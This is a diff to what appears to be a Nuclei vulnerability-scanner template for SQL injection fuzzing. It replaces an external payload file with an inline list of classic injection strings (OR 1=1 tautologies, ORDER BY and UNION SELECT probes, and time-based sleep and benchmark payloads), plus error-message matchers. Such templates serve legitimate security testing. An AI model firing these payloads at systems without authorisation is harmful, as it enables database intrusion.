@@ -1,4 +1,4 @@
-id: heavy-sqli-fuzz
+﻿id: heavy-sqli-fuzz
 
 info:
   name: Heavy SQLi Fuzzing (Custom List)
@@ -13,7 +13,20 @@ http:
       - "{{BaseURL}}"
 
     payloads:
-      sqli_payloads: "../payloads/allsqli.txt"
+      sqli_payloads:
+        - "' OR 1=1 --"
+        - "\" OR 1=1 --"
+        - "' OR '1'='1"
+        - "\" OR \"1\"=\"1"
+        - "1' ORDER BY 1--+"
+        - "1' ORDER BY 2--+"
+        - "1' ORDER BY 3--+"
+        - "1 UNION SELECT 1,2,3--+"
+        - "@@version"
+        - "WAITFOR DELAY '0:0:5'"
+        - "BENCHMARK(5000000,MD5(1))"
+        - "pg_sleep(5)"
+        - "' or sleep(5)#"
 
     fuzzing:
       - part: query
@@ -34,3 +47,4 @@ http:
           - "SQLite/JDBCDriver"
           - "System.Data.SqlClient.SqlException"
           - "Unclosed quotation mark"
+
